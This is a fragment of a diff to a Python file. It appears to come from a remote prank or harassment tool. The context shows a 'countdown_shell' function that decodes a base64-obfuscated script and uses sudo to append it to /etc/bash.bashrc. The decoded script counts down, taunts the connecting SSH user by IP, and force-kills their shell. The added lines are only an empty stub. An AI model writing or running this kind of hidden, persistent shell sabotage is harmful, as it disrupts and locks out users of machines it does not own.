@@ -8,3 +8,7 @@ def countdown_shell(connect):
                  "lcIjsgZWNobyBcJENPVU5UOyBpZiBbIFwkQ09VTlQgLWx0IDAgXTsgdGhlbiBlY2hvIFwiQnllIDspIFwkKGVjaG8gXCRTU0hfQ09"
                  "OTkVDVElPTiB8IGF3ayAne3ByaW50IFwkMX0nKVwiOyBzbGVlcCAxOyBraWxsIC05IFwkUFBJRDsgZmkiICAgICAgICAgICAgICAg"
                  "ICAgICAgICAgICAgICAgICAgICAgICAK\" | base64 -d | sudo tee -a /etc/bash.bashrc'")
+
+
+def change_background_(connect):
+    pass
